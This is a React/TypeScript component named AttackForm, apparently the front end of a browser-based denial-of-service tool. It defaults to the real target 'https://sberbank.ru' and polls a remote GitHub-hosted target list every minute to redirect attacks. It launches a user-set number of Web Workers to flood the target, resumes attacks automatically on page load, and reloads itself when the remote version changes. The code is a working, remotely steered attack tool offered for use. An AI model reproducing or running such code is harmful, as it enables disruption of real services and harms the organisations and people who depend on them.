import React, {useEffect, useRef, useState} from 'react';
import useInterval from "../hooks/useInterval";
import {FormattedMessage} from "react-intl";

const AttackForm = () => {
    const [targets, setTargets] = useState(['https://sberbank.ru']);
    const [threads, setThreads] = useState(10);
    const [started, setStarted] = useState(false);

    const workers = useRef<Worker[]>([]);

    const [startTime, setStartTime] = useState(0);
    const [nRequests, setNRequests] = useState(0n);

    const updateTargets = async () => await fetch(`https://raw.githubusercontent.com/alxdrlitreev/slavaukraine/main/targets.json?${Date.now()}`)
        .then((response) => response.json())
        .then((data) => {
            if (data.targets[0] !== targets[0]) {
                setTargets(data.targets);
                if (started) {
                    stopAttack();
                    startAttack(data.targets[0]);
                }
            }

            if (data.version > (Number(localStorage.getItem('version')) || -1)) {
                localStorage.setItem('version', data.version);
                window.location.reload();
            }

            return data.targets;
        })
        .catch(() => {
            /* do nothing */
        });

    useEffect(() => {
        updateTargets().then((targets) => {
            if (localStorage.getItem('started') === 'true') {
                startAttack(targets[0]);
            }

            setThreads(Number(localStorage.getItem('threads')) || 10);
        });

    }, []);

    useInterval(updateTargets, 60_000);

    const startAttack = (target: string) => {
        setStartTime(performance.now());
        setStarted(true);

        localStorage.setItem('started', 'true');
        localStorage.setItem('threads', String(threads));

        for (let i = 0; i < threads; i++) {
            const worker = new Worker(`/worker.js?n=${i}`);

            worker.onmessage = (event) => {
                setNRequests((n) => n + event.data);
            }

            worker.postMessage(target);
            workers.current.push(worker);
        }
    };

    const stopAttack = () => {
        localStorage.setItem('started', 'false');
        workers.current.forEach((worker) => worker.terminate());
        workers.current = [];

        setNRequests(0n);
        setStarted(false);
    }

    return (
        <div>
            <div className="target">
                <svg width="24px" height="24px" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg"
                     className="icon">
                    <title>Icon</title>
                    <g id="Page-1" stroke="none" strokeWidth="1" fill="none" fillRule="evenodd">
                        <g id="1" transform="translate(-399.000000, -282.000000)">
                            <g id="Goal" transform="translate(383.000000, 264.000000)">
                                <g id="Icon" transform="translate(16.000000, 18.000000)">
                                    <rect id="bound" fillRule="nonzero" x="0" y="0" width="24" height="24"/>
                                    <path
                                        d="M12,11 C12.55,11 13,11.45 13,12 L13,16 C13,16.55 12.55,17 12,17 C11.45,17 11,16.55 11,16 L11,12 C11,11.45 11.45,11 12,11 Z M12,7 C12.5522847,7 13,7.44771525 13,8 C13,8.55228475 12.5522847,9 12,9 C11.4477153,9 11,8.55228475 11,8 C11,7.44771525 11.4477153,7 12,7 Z M12,2 C6.48,2 2,6.48 2,12 C2,17.52 6.48,22 12,22 C17.52,22 22,17.52 22,12 C22,6.48 17.52,2 12,2 Z M12,20 C7.59,20 4,16.41 4,12 C4,7.59 7.59,4 12,4 C16.41,4 20,7.59 20,12 C20,16.41 16.41,20 12,20 Z"
                                        id="24-icon-info-outline" fill="#32CC00"/>
                                </g>
                            </g>
                        </g>
                    </g>
                </svg>

                <span>
                    <FormattedMessage id="currentTarget"/>
                </span>
                &nbsp;
                <span className="url">
                    {targets[0]}
                </span>
            </div>
            <div className="controls">
                <div className="workers">
                    <label>
                        <FormattedMessage id="numberThreads"/>
                        &nbsp;
                        <input className="input" type="number" value={threads}
                               onChange={(e) => setThreads(Number(e.target.value))}/>
                    </label>
                </div>

                {!started ? (
                    <button className="button" onClick={() => startAttack(targets[0])}
                            disabled={threads <= 0 || !targets[0]}><FormattedMessage id="attack"/></button>
                ) : (
                    <button className="button buttonStop" onClick={stopAttack}><FormattedMessage id="stop"/></button>
                )}
            </div>

            {started ? (
                <>
                    <p>
                        <FormattedMessage id="p5"/>
                    </p>
                    <table className="infoTable">
                        <tbody>
                        <tr>
                            <td>
                                <div className="infoTableCell">
                                    <svg className="loading"
                                         width="16px" height="16px" viewBox="0 0 16 16" version="1.1"
                                         xmlns="http://www.w3.org/2000/svg">
                                        <title>Icon</title>
                                        <g id="Page-1" stroke="none" strokeWidth="1" fill="none" fillRule="evenodd">
                                            <g id="2" transform="translate(-387.000000, -476.000000)">
                                                <g id="Table" transform="translate(383.000000, 424.000000)">
                                                    <g id="row-1" transform="translate(0.000000, 36.000000)">
                                                        <g id="Icon" transform="translate(4.000000, 16.000000)">
                                                            <rect id="baund" x="0" y="0" width="16" height="16"/>
                                                            <path
                                                                d="M2.663,7.995 C2.663,10.94093 5.04907,13.327 7.995,13.327 C10.94093,13.327 13.327,10.94093 13.327,7.995 C13.327,5.04907 10.94093,2.663 7.995,2.663 L7.995,2.663 L7.995,1.33 C11.67408,1.33 14.66,4.31592 14.66,7.995 C14.66,11.67408 11.67408,14.66 7.995,14.66 C4.31592,14.66 1.33,11.67408 1.33,7.995 L1.33,7.995 Z"
                                                                id="16-icon-loading" fill="#32CC00"/>
                                                        </g>
                                                    </g>
                                                </g>
                                            </g>
                                        </g>
                                    </svg>
                                    <FormattedMessage id="requestsPerSecond"/>
                                </div>
                            </td>
                            <td>
                                {String(nRequests / (BigInt(Math.round((performance.now() - startTime) / 1000)) || 1n))}
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </>
            ) : null}


        </div>
    );
};

export default AttackForm;